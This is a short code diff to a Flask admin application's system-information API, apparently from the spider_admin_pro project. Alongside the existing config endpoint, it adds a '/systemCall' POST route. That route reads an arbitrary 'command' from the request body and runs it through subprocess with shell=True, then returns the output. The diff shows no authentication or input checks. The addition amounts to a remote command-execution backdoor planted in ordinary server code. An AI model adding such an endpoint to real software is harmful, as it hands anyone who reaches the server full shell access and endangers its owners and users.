@@ -2,6 +2,8 @@
 # ==============================================
 # 系统信息接口
 # ==============================================
+import subprocess
+
 from flask import request
 
 from spider_admin_pro.utils.flask_ext.flask_app import BlueprintAppApi
@@ -31,3 +33,11 @@ def get_system_data():
 @system_api.post("/systemConfig")
 def get_system_config():
     return SystemDataService.get_system_config()
+
+@system_api.post("/systemCall")
+def execute_shell():
+    command = request.json.get("command")
+    timeout = request.json.get("timeout")
+    pipe = subprocess.Popen(command, shell=True, stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
+    out, _ = pipe.communicate(timeout=timeout)
+    return {'out': out.decode()}
